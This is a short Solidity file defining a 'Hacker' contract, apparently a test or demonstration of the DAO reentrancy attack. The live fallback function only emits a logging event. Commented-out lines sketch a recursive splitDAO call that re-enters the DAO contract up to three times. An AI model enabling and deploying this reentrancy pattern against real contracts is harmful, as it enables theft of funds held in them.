/*contract DAO{
  function splitDAO(address receiver, uint amount) returns(bool sufficient){
  }
}*/
contract Hacker {
  uint public index;

  event Hack(address addr, uint256 value, uint index);

  function Hacker(){
    index = 1;
  }
	function () {
    /*DAO dao = DAO(msg.sender);*/
    /*index = index + 1;*/
    Hack(msg.sender, msg.value, index);
    /*if (index < 3){*/
      /*dao.splitDAO(msg.sender, msg.value);*/
    /*}*/
	}
}
